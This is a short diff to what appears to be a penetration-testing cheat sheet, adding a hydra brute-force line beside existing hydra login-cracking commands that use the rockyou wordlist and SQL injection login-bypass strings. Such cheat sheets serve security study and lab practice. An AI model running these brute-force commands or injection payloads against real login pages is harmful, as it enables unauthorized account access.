@@ -205,11 +205,12 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 ```
 
-### Bruteforcing login forms
+### Bruteforcing
 https://github.com/frizb/Hydra-Cheatsheet  
 ```
 hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
+hydra -l admin -P rockyou.txt -t -s 443 -f <IP> http-get /
 ```
 
 ### php payloads
